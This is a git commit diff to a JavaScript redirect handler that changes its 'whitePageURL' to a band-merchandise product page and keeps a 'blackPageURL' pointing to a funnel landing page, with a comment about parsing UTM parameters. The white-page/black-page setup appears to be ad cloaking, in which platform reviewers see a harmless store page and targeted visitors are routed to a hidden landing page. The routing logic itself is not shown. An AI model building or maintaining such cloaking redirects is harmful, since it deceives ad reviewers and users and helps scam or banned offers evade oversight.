dfb5011733ca2781e1cec25bda654d4fb973b610
baagh1 <starcricket00@gmail.com>
2025-01-12 23:21:26 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://salty-crew.com/products/lifted-ss-tee-black";
+    const whitePageURL = "https://shopus.beastieboys.com/collections/t-shirts/products/aba-ringer-t-shirt";
     const blackPageURL = "https://qgclxsamql.myfunnelish.com/imbassd-1735585339447351";
   
     // Parse the UTM parameters from the request URL
